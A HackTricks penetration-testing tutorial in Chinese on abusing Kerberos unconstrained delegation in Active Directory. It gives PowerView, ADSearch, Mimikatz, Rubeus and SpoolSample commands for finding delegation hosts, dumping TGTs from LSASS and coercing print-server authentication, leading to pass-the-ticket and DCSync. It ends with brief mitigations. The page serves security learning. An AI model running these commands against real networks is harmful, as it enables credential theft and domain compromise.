# 无限委派

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要看到你的 **公司在 HackTricks 中被宣传**？或者想要访问 **PEASS 的最新版本或下载 HackTricks 的 PDF**？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我的 **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>

## 无限委派

这是域管理员可以设置给域内任何 **计算机** 的一个功能。每当 **用户登录** 到计算机上时，该用户的 **TGT 副本** 将会被发送到由 DC 提供的 TGS 中，并保存在 LSASS 中的内存中。因此，如果你在计算机上拥有管理员权限，你将能够 **转储票据并冒充用户** 在任何计算机上。

因此，如果一个域管理员在启用了 "无限委派" 功能的计算机上登录，而你在该计算机上拥有本地管理员权限，你将能够转储票据并冒充域管理员在任何地方（域权限提升）。

你可以通过检查 [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) 属性是否包含 [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) 来 **查找具有此属性的计算机对象**。你可以使用 LDAP 过滤器 ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ 来执行此操作，这就是 powerview 所做的事情：

<pre class="language-bash"><code class="lang-bash"># 列出无限委派计算机
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># 使用 Mimikatz 导出票据
</strong>privilege::debug
sekurlsa::tickets /export #推荐的方式
kerberos::list /export #另一种方式

# 监视登录并导出新票据
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #每 10 秒检查新的 TGTs</code></pre>

使用 **Mimikatz** 或 **Rubeus** 将管理员（或受害用户）的票据加载到内存中进行 [**传递票据攻击**](pass-the-ticket.md)。\
更多信息：[https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**有关无限委派的更多信息，请查看 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **强制认证**

如果攻击者能够 **入侵允许 "无限委派" 的计算机**，他可以 **欺骗** 一个 **打印服务器** 自动登录到该计算机 **在服务器的内存中保存一个 TGT**。\
然后，攻击者可以执行 **传递票据攻击来冒充** 用户打印服务器计算机帐户。

要让打印服务器登录到任何计算机，你可以使用 [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
如果TGT来自域控制器，您可以执行**DCSync攻击**并从DC获取所有哈希值。\
[**有关此攻击的更多信息，请查看ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**以下是尝试强制身份验证的其他方法：**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### 缓解措施

* 限制DA/Admin登录到特定服务
* 为特权帐户设置“帐户是敏感的，不能被委派”。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？ 您想看到您的**公司在HackTricks中被宣传**吗？ 或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我在**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
